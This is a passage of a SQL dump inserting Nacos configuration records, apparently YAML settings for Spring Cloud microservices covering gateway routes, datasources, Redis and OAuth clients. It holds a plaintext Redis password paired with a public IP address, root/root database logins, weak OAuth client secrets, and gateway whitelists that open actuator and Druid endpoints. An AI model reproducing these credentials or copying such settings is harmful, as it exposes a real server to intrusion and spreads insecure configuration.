            dataId: ${spring.application.name}-gw-flow-rules
            groupId: SENTINEL_GROUP
            rule-type: gw-flow
        # 自定义API分组，gw-api-group为key，随便定义
        gw-api-group:
          nacos:
            server-addr: ${spring.cloud.nacos.discovery.server-addr}
            dataId: ${spring.application.name}-gw-api-group-rules
            groupId: SENTINEL_GROUP
            rule-type: gw-api-group
# Feign 配置
feign:
  httpclient:
    enabled: true
  okhttp:
    enabled: false
  sentinel:  # 开启feign对sentinel的支持
    enabled: false 

# 禁止访问路径
security:
  forbiddenURIs:
      # 获取用户认证信息
      - /youlai-system/api/v1/users/{username}/authinfo', 'c032abf67bd8d41c0ed7924473ef008e', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (220, 'youlai-system.yaml', 'DEFAULT_GROUP', 'spring:
  datasource:
    type: com.alibaba.druid.pool.DruidDataSource
    driver-class-name: com.mysql.cj.jdbc.Driver 
    url: jdbc:mysql://${mysql.host}:${mysql.port}/youlai_system?zeroDateTimeBehavior=convertToNull&useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai&autoReconnect=true
    username: ${mysql.username}
    password: ${mysql.password}
  redis:
    database: 0
    host: ${redis.host}
    port: ${redis.port}
    password: ${redis.password}
    lettuce:
      pool:
        min-idle: 1
  # RabbitMQ 配置
  rabbitmq:
    host: ${rabbitmq.host}
    port: ${rabbitmq.port}
    username: ${rabbitmq.username}
    password: ${rabbitmq.password}
    virtual-host: /
  elasticsearch:
    rest:
      uris: ["http://d.youlai.tech:9200"]
      cluster-nodes:
        - d.youlai.tech:9200
  cache:
    # 缓存类型 redis、none(不使用缓存) 
    type: none
    # 缓存时间(单位：ms)
    redis:
      time-to-live: 3600000
      # 缓存null值，防止缓存穿透
      cache-null-values: true
      # 允许使用缓存前缀
      use-key-prefix: true
      # 缓存前缀，没有设置使用注解的缓存名称(value)作为前缀，和注解的key用双冒号::拼接组成完整缓存key
      key-prefix: \'admin:\'
  cloud:
    sentinel:
      enabled: true
      eager: true # 取消控制台懒加载，项目启动即连接Sentinel
      transport:
        client-ip: localhost
        dashboard: localhost:8080
      datasource:
        # 限流规则，flow为key，随便定义
        flow:
          nacos:
            server-addr: ${spring.cloud.nacos.discovery.server-addr}
            dataId: ${spring.application.name}-flow-rules
            groupId: SENTINEL_GROUP
            data-type: json
            rule-type: flow
        # 降级规则
        degrade:
          nacos:
            server-addr: ${spring.cloud.nacos.discovery.server-addr}
            dataId: ${spring.application.name}-degrade-rules
            groupId: SENTINEL_GROUP
            data-type: json
            rule-type: degrade
                
mybatis-plus:
  configuration:
    # 驼峰下划线转换
    map-underscore-to-camel-case: true
    # 这个配置会将执行的sql打印出来，在开发或测试的时候可以用
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl
    default-enum-type-handler: org.apache.ibatis.type.EnumOrdinalTypeHandler

feign:
  httpclient:
    enabled: true
  okhttp:
    enabled: false
  sentinel:  # 开启feign对sentinel的支持
    enabled: false

# 白名单路径
security:
  ignoreUrls:
      - /webjars/**
      - /doc.html
      - /swagger-resources/**
      - /v2/api-docs
      - /api/v1/users/{username}/authInfo', 'e48f895df7661a41f91b2859977882fd', '2024-08-11 09:05:37', '2024-08-11 09:05:37', null, '61.140.102.249', '', 'b4eaa489-d706-49af-8d67-25a504a6aa58', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (264, 'flycloud-file-admin-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


#       其他数据库系统-参数说明:          
#        oracle:
#          type: ${spring.datasource.type}
#          driverClassName: oracle.jdbc.OracleDriver
#          url: ${datasource.system-oracle.url}
#          username: ${datasource.system-oracle.username}
#          password: ${datasource.system-oracle.password}
#          hikari:
#            connectionTestQuery: SELECT 1 FROM DUAL

#        postgres:
#          type: ${spring.datasource.type}
#          driverClassName: org.postgresql.Driver
#          url: ${datasource.system-postgres.url}
#          username: ${datasource.system-postgres.username}
#          password: ${datasource.system-postgres.password}



# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fly

      # 客户端安全码
      client-secret: fly_secret

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**   
        # - /provider/**



', '67b00db563365dc21b472190b4d377f3', '2024-08-14 11:09:49', '2024-08-14 11:09:49', null, '119.34.164.140', '', '', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (265, 'application-datasource.yaml', 'DEFAULT_GROUP', '
# 数据源连接 配置
datasource:

  # 系统模块的-主库数据源 (根据需求配置-从库数据源)
  system-master:
    # jdbc 所有参数配置参考 https://lionli.blog.csdn.net/article/details/122018562
    # rewriteBatchedStatements=true 批处理优化 大幅提升批量插入更新删除性能
    url: jdbc:mysql://localhost:3306/fdance_cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root
  # system-slave:

  # 客户端-主库数据源
  mall-master:
    url: jdbc:mysql://localhost:3306/fdance_cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root

  # 定时任务数据库
  # job:
  #   url: jdbc:mysql://localhost:3306/fly-job?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
  #   username: root
  #   password: root

  # 自动生成数据库说明: 由于要自动生成某个数据库的表信息, 所以只需要指向你要生成的已经在使用的数据库即可
  gen:
    url: jdbc:mysql://localhost:3306/fdance_cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root


# 数据源属性 配置
spring:
  datasource:
    type: com.zaxxer.hikari.HikariDataSource
    # 动态数据源文档 https://www.kancloud.cn/tracy5546/dynamic-datasource/content
    dynamic:
      # 性能分析插件(有性能损耗 不建议生产环境使用)
      p6spy: false
      # 开启seata代理，开启后默认每个数据源都代理，如果某个不需要代理可单独关闭
      # seata: false
      # 严格模式 匹配不到数据源则报错
      strict: true
      hikari:
        # 最大连接池数量
        maxPoolSize: 20
        # 最小空闲线程数量
        minIdle: 10
        # 配置获取连接等待超时的时间
        connectionTimeout: 30000
        # 校验超时时间
        validationTimeout: 5000
        # 空闲连接存活最大时间，默认10分钟
        idleTimeout: 600000
        # 此属性控制池中连接的最长生命周期，值0表示无限生命周期，默认30分钟
        maxLifetime: 1800000
        # 连接测试query（配置检测连接是否有效）
        connectionTestQuery: SELECT 1
        # 多久检查一次连接的活性
        keepaliveTime: 30000


# seata配置
seata:
  # 关闭自动代理
  enable-auto-data-source-proxy: false


# MyBatisPlus配置  (https://baomidou.com/config/)
mybatis-plus:
  # 扫描mapper接口包有两种: (法1: 默认扫描(也就是加@Mapper注解);  法2: 手动扫描, 在相关启动配置类加上@MapperScan("要扫描包的路径"),  
  # 本项目用的是 法2 (因为基本上整个项目的包名前缀都是一样的,除非要注入第三方的bean); 如有需要支持多包可在注解配置 或 提升扫包等级 (例如 com.**.**.mapper)
  mapperPackage: com.freedom.dance.**.mapper
  # 对应的 XML 文件位置
  mapperLocations: classpath*:mapper/**/*Mapper.xml
  # 实体扫描，多个package用逗号或者分号分隔
  typeAliasesPackage: com.freedom.dance.**.domain,com.freedom.dance.**.api.entity
  # 启动时是否检查 MyBatis XML 文件的存在，默认不检查
  checkConfigLocation: false
  configuration:
    # 自动驼峰命名规则（camel case）映射
    mapUnderscoreToCamelCase: true
    # MyBatis 自动映射策略
    # NONE：不启用 PARTIAL：只对非嵌套 resultMap 自动映射 FULL：对所有 resultMap 自动映射
    autoMappingBehavior: PARTIAL
    # MyBatis 自动映射时未知列或未知属性处理策
    # NONE：不做处理 WARNING：打印相关警告 FAILING：抛出异常和详细信息
    autoMappingUnknownColumnBehavior: NONE
    # 更详细的日志输出 会有性能损耗 org.apache.ibatis.logging.stdout.StdOutImpl
    # 关闭日志记录 (可单纯使用 p6spy 分析) org.apache.ibatis.logging.nologging.NoLoggingImpl
    # 默认日志输出 org.apache.ibatis.logging.slf4j.Slf4jImpl
    logImpl: org.apache.ibatis.logging.nologging.NoLoggingImpl
  global-config:
    # 是否打印 Logo banner
    banner: true
    dbConfig:
      # 主键类型
      # AUTO 自增 NONE 空 INPUT 用户输入 ASSIGN_ID 雪花 ASSIGN_UUID 唯一 UUID
      idType: ASSIGN_ID
      # 逻辑已删除值
      logicDeleteValue: 2
      # 逻辑未删除值
      logicNotDeleteValue: 0
      insertStrategy: NOT_NULL
      updateStrategy: NOT_NULL
      where-strategy: NOT_NULL


# 数据加密
mybatis-encryptor:
  # 是否开启加密
  enable: false
  # 默认加密算法
  algorithm: BASE64
  # 编码方式 BASE64/HEX。默认BASE64
  encode: BASE64
  # 安全秘钥 对称算法的秘钥 如：AES，SM4
  password:
  # 公私钥 非对称算法的公私钥 如：SM2，RSA
  publicKey:
  privateKey:
  ', '3b64395df9334641eefddefd0b913cee', '2024-08-18 07:27:58', '2024-08-18 07:27:58', null, '61.140.102.252', '', 'a7670b3a-25e9-4f2f-a1fc-a334a84d0e5d', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (266, 'application-common.yaml', 'DEFAULT_GROUP', '
# spring 配置
spring:
  # 资源信息
  messages:
    # 国际化资源文件路径
    basename: i18n/messages
  servlet:
    multipart:
      # 单个文件大小
      max-file-size: 1000MB
      # 设置总上传的文件大小
      max-request-size: 5000MB

  # bean重名覆盖
  main:
    allow-bean-definition-overriding: true
    allow-circular-references: true

  mvc:
    format:
      date-time: yyyy-MM-dd HH:mm:ss
  #jackson配置
  jackson:
    # 日期格式化
    date-format: yyyy-MM-dd HH:mm:ss
    time-zone: GMT+8
    serialization:
      # 格式化输出
      INDENT_OUTPUT: false
      # 忽略无法转换的对象
      fail_on_empty_beans: false
    deserialization:
      # 允许对象忽略json中不存在的属性
      fail_on_unknown_properties: false
  cloud:
    # sentinel 配置
    # sentinel:
    #   # sentinel 开关
    #   enabled: true
    #   # 取消控制台懒加载
    #   eager: true
    #   transport:
    #     # dashboard控制台服务名 用于服务发现
    #     # 如无此配置将默认使用下方 dashboard 配置直接注册
    #     server-name: ruoyi-sentinel-dashboard
    #     # 客户端指定注册的ip 用于多网卡ip不稳点使用
    #     # client-ip:
    #     # 控制台地址 从1.3.0开始使用 server-name 注册
    #     # dashboard: localhost:8718

  # redis 通用配置 子服务可以自行配置进行覆盖
  redis:
    host: 39.98.125.88
    port: 6379
    # 密码(如没有密码请注释掉password字段)
    password: wW257007
    database: 0
    timeout: 30s
    ssl: false


# redisson 配置
redisson:
  # redis key前缀
  keyPrefix:
  # 线程池数量
  threads: 4
  # Netty线程池数量
  nettyThreads: 8
  # 单节点配置
  singleServerConfig:
    # 客户端名称
    clientName: ${spring.application.name}
    # 最小空闲连接数
    connectionMinimumIdleSize: 8
    # 连接池大小
    connectionPoolSize: 32
    # 连接空闲超时，单位：毫秒
    idleConnectionTimeout: 10000
    # 命令等待超时，单位：毫秒
    timeout: 3000
    # 发布和订阅连接池大小
    subscriptionConnectionPoolSize: 50


# springdoc 配置
springdoc:
  api-docs:
    # 是否开启接口文档
    enabled: true
  swagger-ui:
    # 持久化认证数据
    persistAuthorization: true


# swagger 配置
swagger:
  enabled: true
  title: Fly Swagger API
  gateway: http://localhost:8080
  token-url: ${swagger.gateway}/auth/oauth/token
  scope: server
  services:
    flycloud-gateway: flycloud-gateway
    flycloud-system: flycloud-system
    flycloud-mall: flycloud-mall
    flycloud-music: flycloud-music
    flycloud-generator: flycloud-generator
    flycloud-job: flycloud-job
    flycloud-test: flycloud-test
', '1788742953b11f6e6424e3b2bc47d966', '2024-08-18 07:28:49', '2024-08-18 07:28:49', null, '61.140.102.252', '', 'a7670b3a-25e9-4f2f-a1fc-a334a84d0e5d', '公共配置: 如mybatis-plus, redis, es等', null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (267, 'fdance-gateway-dev.yaml', 'DEFAULT_GROUP', '
spring:
  cloud:
    # 网关配置
    gateway:
      metrics:
        enabled: true
      # 打印请求日志(自定义)
      requestLog: true
      discovery:
        locator:
          # 开启服务注册和发现
          enabled: true
          # 自动配置路由 (手动写路由的话, swagger整合不了)
      routes:

        # swagger接口地址重写 (只改变转发路由,无其他修改), 如将 https://localhost:8080/v3/api-docs/fdance-system 这个路径重写为 https://localhost:8080/fdance-system/v3/api-docs
        - id: openapi
          uri: lb://fdance-gateway
          predicates:
            - Path=/v3/api-docs/**
          filters:
            - RewritePath=/v3/api-docs/(?<path>.*), /$\\{path}/v3/api-docs

        - id: fdance-system              # 路由id，没有固定规则但要求唯一, 建议配合服务名
          # uri: http://localhost:8001     # 目标地址, 即断言匹配后跳转的路由地址 (即类似nginx的代理地址)
          uri: lb://fdance-system
          order: 1
          predicates:                      # 断言（判断条件）
            - Path=/fdance-system/**     # 断言, 路径相匹配的进行路由; 服务一般不用设置servlet-context-path,因为直接让客户端请求带上此断言服务名字即可 (即类似nginx的断言)
          # filters:
            # - StripPrefix=1              # 去除第一个路径 (http://localhost:8080/aaa/order/orderInfo -> http://localhost:8080/order/orderInfo)
            # - PrefixPath=/order          # 请求路径添加前缀 (http://localhost:8080/order/orderInfo -> http://localhost:8080/aaa/order/orderInfo)

            # - RewritePath=/v3/api-docs/(?<path>.*), /$\\{path}/v3/api-docs
            # 路由重写 (断言之前执行), 如将 https://localhost:8080/v3/api-docs/fdance-system 这个路径重写为 https://localhost:8080/fdance-system/v3/api-docs

        - id: fdance-auth
          uri: lb://fdance-auth
          predicates:
            - Path=/fdance-auth/**

        - id: fdance-generator
          uri: lb://fdance-generator
          predicates:
            - Path=/fdance-generator/**



# 网关服务安全配置
gateway:
  server:
    security:

      # 网关认证开关
      enable: true

      # 白名单 (授权、swagger、监控中心等url)
      ignore-urls:
        - /oauth/** 
        - /auth/**
        - /actuator/**
        - /webjars/**
        - /druid/**
        - /assets/**
        - /v2/api-docs/**
        - /v3/api-docs/**
        - /swagger/api-docs
        - /swagger-ui.html
        - /swagger-resources/**
        - /doc.html



logging:
  level:
    org:
      springframework:
        cloud:
          gateway: TRACE', '412cde9b4757591faa22c1d02da2bc7a', '2024-08-18 07:31:43', '2024-08-18 07:31:43', null, '61.140.102.252', '', 'a7670b3a-25e9-4f2f-a1fc-a334a84d0e5d', null, null, null, 'yaml', null);
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (268, 'fdance-auth-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


# 安全授权配置
security:
  oauth2:
    client: 

      # 客户端标识 ID
      client-id: fdance_auth

      # 客户端安全码
      client-secret: root

      # 授权类型
      # grant-types: 3
      grant-types: password

      # token有效期
      token-validity-time: 7200

      # refresh-token有效期
      refresh-token-validity-time: 7200

      # 客户端访问范围
      scopes: 

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**  
        - /oauth/**
        - /auth/**
', '5e653cd10744f421718d111f8f2e6fd1', '2024-08-18 07:33:00', '2024-08-18 07:37:31', 'nacos', '61.140.102.252', '', 'a7670b3a-25e9-4f2f-a1fc-a334a84d0e5d', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (269, 'fdance-system-dev.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
    dynamic:
      # 设置默认的数据源或者数据源组,默认值即为 master
      primary: master
      datasource:
        # 主库数据源
        master:
          type: ${spring.datasource.type}
          driver-class-name: com.mysql.cj.jdbc.Driver
          url: ${datasource.system-master.url}
          username: ${datasource.system-master.username}
          password: ${datasource.system-master.password}


# 服务资源安全配置
server:
  resource:
    security:

      # 客户端标识 ID
      client-id: fdance_system

      # 客户端安全码
      client-secret: root

      # 客户端访问范围
      scopes:

      # 白名单 (对外直接暴露服务资源的URL)
      ignore-urls:
        # - /v3/api-docs/**   
        - /provider/**



', '6cc8fc7a61a37a231d79f1a4eb28e358', '2024-08-18 07:34:31', '2024-08-18 07:37:13', 'nacos', '119.34.164.140', '', 'a7670b3a-25e9-4f2f-a1fc-a334a84d0e5d', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (271, 'application-common.yaml', 'DEFAULT_GROUP', '
# spring 配置
spring:
  # 资源信息
  messages:
    # 国际化资源文件路径
    basename: i18n/messages
  servlet:
    multipart:
      # 单个文件大小
      max-file-size: 1000MB
      # 设置总上传的文件大小
      max-request-size: 5000MB

  # bean重名覆盖
  main:
    allow-bean-definition-overriding: true
    allow-circular-references: true

  mvc:
    format:
      date-time: yyyy-MM-dd HH:mm:ss
  #jackson配置
  jackson:
    # 日期格式化
    date-format: yyyy-MM-dd HH:mm:ss
    time-zone: GMT+8
    serialization:
      # 格式化输出
      INDENT_OUTPUT: false
      # 忽略无法转换的对象
      fail_on_empty_beans: false
    deserialization:
      # 允许对象忽略json中不存在的属性
      fail_on_unknown_properties: false
  cloud:
    # sentinel 配置
    # sentinel:
    #   # sentinel 开关
    #   enabled: true
    #   # 取消控制台懒加载
    #   eager: true
    #   transport:
    #     # dashboard控制台服务名 用于服务发现
    #     # 如无此配置将默认使用下方 dashboard 配置直接注册
    #     server-name: ruoyi-sentinel-dashboard
    #     # 客户端指定注册的ip 用于多网卡ip不稳点使用
    #     # client-ip:
    #     # 控制台地址 从1.3.0开始使用 server-name 注册
    #     # dashboard: localhost:8718

  # redis 通用配置 子服务可以自行配置进行覆盖
  redis:
    host: 39.98.125.88
    port: 6379
    # 密码(如没有密码请注释掉password字段)
    password: wW257007
    database: 0
    timeout: 30s
    ssl: false


# redisson 配置
redisson:
  # redis key前缀
  keyPrefix:
  # 线程池数量
  threads: 4
  # Netty线程池数量
  nettyThreads: 8
  # 单节点配置
  singleServerConfig:
    # 客户端名称
    clientName: ${spring.application.name}
    # 最小空闲连接数
    connectionMinimumIdleSize: 8
    # 连接池大小
    connectionPoolSize: 32
    # 连接空闲超时，单位：毫秒
    idleConnectionTimeout: 10000
    # 命令等待超时，单位：毫秒
    timeout: 3000
    # 发布和订阅连接池大小
    subscriptionConnectionPoolSize: 50


# springdoc 配置
springdoc:
  api-docs:
    # 是否开启接口文档
    enabled: true
  swagger-ui:
    # 持久化认证数据
    persistAuthorization: true


# swagger 配置
swagger:
  enabled: true
  title: Fly Swagger API
  gateway: http://localhost:8080
  token-url: ${swagger.gateway}/auth/oauth/token
  scope: server
  services:
    flycloud-gateway: flycloud-gateway
    flycloud-system: flycloud-system
    flycloud-mall: flycloud-mall
    flycloud-music: flycloud-music
    flycloud-generator: flycloud-generator
    flycloud-job: flycloud-job
    flycloud-test: flycloud-test
', '1788742953b11f6e6424e3b2bc47d966', '2024-09-02 09:51:03', '2024-09-02 09:54:02', 'nacos', '119.34.164.140', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '公共配置: 如mybatis-plus, redis, es等', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (272, 'flycloud-gateway-prod.yaml', 'DEFAULT_GROUP', '
spring:
  cloud:
    # 网关配置
    gateway:
      metrics:
        enabled: true
      # 打印请求日志(自定义)
      requestLog: true
      discovery:
        locator:
          # 开启服务注册和发现
          enabled: true
          # 自动配置路由 (手动写路由的话, swagger整合不了)
      routes:

        # swagger接口地址重写 (只改变转发路由,无其他修改), 如将 https://localhost:8080/v3/api-docs/flycloud-system 这个路径重写为 https://localhost:8080/flycloud-system/v3/api-docs
        - id: openapi
          uri: lb://flycloud-gateway
          predicates:
            - Path=/v3/api-docs/**
          filters:
            - RewritePath=/v3/api-docs/(?<path>.*), /$\\{path}/v3/api-docs

        - id: flycloud-system              # 路由id，没有固定规则但要求唯一, 建议配合服务名
          # uri: http://localhost:8001     # 目标地址, 即断言匹配后跳转的路由地址 (即类似nginx的代理地址)
          uri: lb://flycloud-system
          order: 1
          predicates:                      # 断言（判断条件）
            - Path=/flycloud-system/**     # 断言, 路径相匹配的进行路由; 服务一般不用设置servlet-context-path,因为直接让客户端请求带上此断言服务名字即可 (即类似nginx的断言)
          # filters:
            # - StripPrefix=1              # 去除第一个路径 (http://localhost:8080/aaa/order/orderInfo -> http://localhost:8080/order/orderInfo)
            # - PrefixPath=/order          # 请求路径添加前缀 (http://localhost:8080/order/orderInfo -> http://localhost:8080/aaa/order/orderInfo)

            # - RewritePath=/v3/api-docs/(?<path>.*), /$\\{path}/v3/api-docs
            # 路由重写 (断言之前执行), 如将 https://localhost:8080/v3/api-docs/flycloud-system 这个路径重写为 https://localhost:8080/flycloud-system/v3/api-docs

        - id: flycloud-auth
          uri: lb://flycloud-auth
          predicates:
            - Path=/flycloud-auth/**

        - id: flycloud-mall
          uri: lb://flycloud-mall
          predicates:
            - Path=/flycloud-mall/**

        - id: flycloud-generator
          uri: lb://flycloud-generator
          predicates:
            - Path=/flycloud-generator/**

        - id: flycloud-test
          uri: lb://flycloud-test
          predicates:
            - Path=/flycloud-test/**



# 网关服务安全配置
gateway:
  server:
    security:

      # 网关认证开关
      enable: true

      # 白名单 (授权、swagger、监控中心等url)
      ignore-urls:
        - /oauth/** 
        - /auth/**
        - /gen/**
        - /actuator/**
        - /webjars/**
        - /druid/**
        - /assets/**
        - /v2/api-docs/**
        - /v3/api-docs/**
        - /swagger/api-docs
        - /swagger-ui.html
        - /swagger-resources/**
        - /doc.html



logging:
  level:
    org:
      springframework:
        cloud:
          gateway: TRACE', '2a44a1535ae097d7c0cfbf13c3b722ff', '2024-09-02 09:51:03', '2024-11-24 04:37:38', 'nacos', '113.88.68.191', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (273, 'application-datasource.yaml', 'DEFAULT_GROUP', '
# 数据源连接 配置
datasource:

  # 系统模块的-主库数据源 (根据需求配置-从库数据源)
  system-master:
    # jdbc 所有参数配置参考 https://lionli.blog.csdn.net/article/details/122018562
    # rewriteBatchedStatements=true 批处理优化 大幅提升批量插入更新删除性能
    url: jdbc:mysql://localhost:3306/fly-cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root
  # system-slave:

  # 工作流模块的-主库数据源 
  bpm-master:
    url: jdbc:mysql://localhost:3306/fly-cloud?useSSL=false&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true&nullCatalogMeansCurrent=true&rewriteBatchedStatements=true
    username: root
    password: root
  # bpm-slave:

  # 商城模块的-主库数据源
  mall-master:
    url: jdbc:mysql://localhost:3306/fly-cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root

  # 音乐模块的-主库数据源
  music-master:
    url: jdbc:mysql://localhost:3306/fly-music?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root

  # 定时任务数据库
  job:
    url: jdbc:mysql://localhost:3306/fly-job?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root

  # 自动生成数据库说明: 由于要自动生成某个数据库的表信息, 所以只需要指向你要生成的已经在使用的数据库即可
  gen:
    url: jdbc:mysql://localhost:3306/fly-cloud?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=false&serverTimezone=GMT%2B8&rewriteBatchedStatements=true
    username: root
    password: root
    
#  其他数据库系统说明
#  system-oracle:
#    url: jdbc:oracle:thin:@//localhost:1521/XE
#    username: ROOT
#    password: password

#  system-postgres:
#    url: jdbc:postgresql://localhost:5432/postgres?useUnicode=true&characterEncoding=utf8&useSSL=false&autoReconnect=true&reWriteBatchedInserts=true
#    username: root
#    password: password


# 数据源属性 配置
spring:
  datasource:
    type: com.zaxxer.hikari.HikariDataSource
    # 动态数据源文档 https://www.kancloud.cn/tracy5546/dynamic-datasource/content
    dynamic:
      # 性能分析插件(有性能损耗 不建议生产环境使用)
      p6spy: false
      # 开启seata代理，开启后默认每个数据源都代理，如果某个不需要代理可单独关闭
      # seata: false
      # 严格模式 匹配不到数据源则报错
      strict: true
      hikari:
        # 最大连接池数量
        maxPoolSize: 20
        # 最小空闲线程数量
        minIdle: 10
        # 配置获取连接等待超时的时间
        connectionTimeout: 30000
        # 校验超时时间
        validationTimeout: 5000
        # 空闲连接存活最大时间，默认10分钟
        idleTimeout: 600000
        # 此属性控制池中连接的最长生命周期，值0表示无限生命周期，默认30分钟
        maxLifetime: 1800000
        # 连接测试query（配置检测连接是否有效）
        connectionTestQuery: SELECT 1
        # 多久检查一次连接的活性
        keepaliveTime: 30000


# seata配置
seata:
  # 关闭自动代理
  enable-auto-data-source-proxy: false


# MyBatisPlus配置  (https://baomidou.com/config/)
mybatis-plus:
  # 扫描mapper接口包有两种: (法1: 默认扫描(也就是加@Mapper注解);  法2: 手动扫描, 在相关启动配置类加上@MapperScan("要扫描包的路径"),  
  # 本项目用的是 法2 (因为基本上整个项目的包名前缀都是一样的,除非要注入第三方的bean); 如有需要支持多包可在注解配置 或 提升扫包等级 (例如 com.**.**.mapper)
  mapperPackage: com.fly.**.mapper
  # 对应的 XML 文件位置
  mapperLocations: classpath*:mapper/**/*Mapper.xml
  # 实体扫描，多个package用逗号或者分号分隔
  typeAliasesPackage: com.fly.**.domain,com.flycloud.**.api.entity
  # 启动时是否检查 MyBatis XML 文件的存在，默认不检查
  checkConfigLocation: false
  configuration:
    # 自动驼峰命名规则（camel case）映射
    mapUnderscoreToCamelCase: true
    # MyBatis 自动映射策略
    # NONE：不启用 PARTIAL：只对非嵌套 resultMap 自动映射 FULL：对所有 resultMap 自动映射
    autoMappingBehavior: PARTIAL
    # MyBatis 自动映射时未知列或未知属性处理策
    # NONE：不做处理 WARNING：打印相关警告 FAILING：抛出异常和详细信息
    autoMappingUnknownColumnBehavior: NONE
    # 更详细的日志输出 会有性能损耗 org.apache.ibatis.logging.stdout.StdOutImpl
    # 关闭日志记录 (可单纯使用 p6spy 分析) org.apache.ibatis.logging.nologging.NoLoggingImpl
    # 默认日志输出 org.apache.ibatis.logging.slf4j.Slf4jImpl
    logImpl: org.apache.ibatis.logging.nologging.NoLoggingImpl
  global-config:
    # 是否打印 Logo banner
    banner: true
    dbConfig:
      # 主键类型
      # AUTO 自增 NONE 空 INPUT 用户输入 ASSIGN_ID 雪花 ASSIGN_UUID 唯一 UUID
      idType: ASSIGN_ID
      # 逻辑已删除值
      logicDeleteValue: 2
      # 逻辑未删除值
      logicNotDeleteValue: 0
      insertStrategy: NOT_NULL
      updateStrategy: NOT_NULL
      where-strategy: NOT_NULL


# 数据加密
mybatis-encryptor:
  # 是否开启加密
  enable: false
  # 默认加密算法
  algorithm: BASE64
  # 编码方式 BASE64/HEX。默认BASE64
  encode: BASE64
  # 安全秘钥 对称算法的秘钥 如：AES，SM4
  password:
  # 公私钥 非对称算法的公私钥 如：SM2，RSA
  publicKey:
  privateKey:
  ', 'c086dee54970f67ddd22341f67f98780', '2024-09-02 09:51:03', '2025-05-10 15:19:08', 'nacos', '116.21.158.250', '', 'c5ab8826-7c54-44ee-a089-49a3dd530652', '', '', '', 'yaml', '');
INSERT INTO nacos.config_info (id, data_id, group_id, content, md5, gmt_create, gmt_modified, src_user, src_ip, app_name, tenant_id, c_desc, c_use, effect, type, c_schema) VALUES (274, 'flycloud-system-prod.yaml', 'DEFAULT_GROUP', '
spring:
  datasource:
